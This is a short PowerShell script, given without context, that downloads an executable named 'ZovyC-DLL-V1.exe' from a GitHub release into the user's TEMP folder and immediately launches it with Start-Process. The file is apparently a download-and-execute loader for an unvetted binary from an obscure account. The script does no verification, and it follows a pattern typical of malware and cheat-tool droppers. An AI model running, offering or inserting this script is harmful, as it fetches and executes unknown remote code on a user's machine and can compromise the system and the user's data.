$file = "$env:TEMP\ZovyC-DLL-V1.exe"

$url = "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe"

(New-Object System.Net.WebClient).DownloadFile($url, $file)

Start-Process $file
